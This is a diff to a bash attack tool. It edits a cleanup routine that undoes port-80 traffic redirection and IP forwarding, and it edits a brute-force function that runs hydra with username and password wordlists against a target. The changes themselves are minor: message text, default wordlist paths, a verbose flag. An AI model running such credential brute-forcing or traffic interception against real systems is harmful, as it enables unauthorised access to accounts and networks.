@@ -17,7 +17,7 @@ help() {
 cleanup() {
 	echo
 	echo
-	 echo -e "\e[34m[+]\e[0m  Stopping attacks.."
+	 echo -e "\e[34m[+]\e[0m  Stopping attacks..."
 	sudo echo "0" > /proc/sys/net/ipv4/ip_forward 2>/dev/null
 	sudo iptables -t nat -D PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port $port 2>/dev/null
 	pkill -f "python3 -m http.server" 2>/dev/null
@@ -191,11 +191,11 @@ bruteforce() {
 	
 		# users file prompt
 		read -p "User file path (press Enter for default): " user_file
-		user_file=${user_file:-"users.txt"}  # default if enter pressed
+		user_file=${user_file:-"wordlists/users.txt"}  # default if enter pressed
 
 		# password file prompt
 		read -p "Password file path (press Enter for default): " pass_file
-		pass_file=${pass_file:-"passwords.txt"}  # Set default if Enter is pressed
+		pass_file=${pass_file:-"wordlists/passwords.txt"}  # Set default if Enter is pressed
 
 		# check if user and password files exist
 		if [[ ! -f $user_file || ! -f $pass_file ]]; then
@@ -227,8 +227,7 @@ bruteforce() {
 		echo "Press Ctrl-C to stop attack"
 		sleep 2
 		echo
-		hydra -L $user_file -P $pass_file $protocol://$target_ip:$port
-		break
+		hydra -v -L $user_file -P $pass_file $protocol://$target_ip:$port 
 	done
 
 	menu
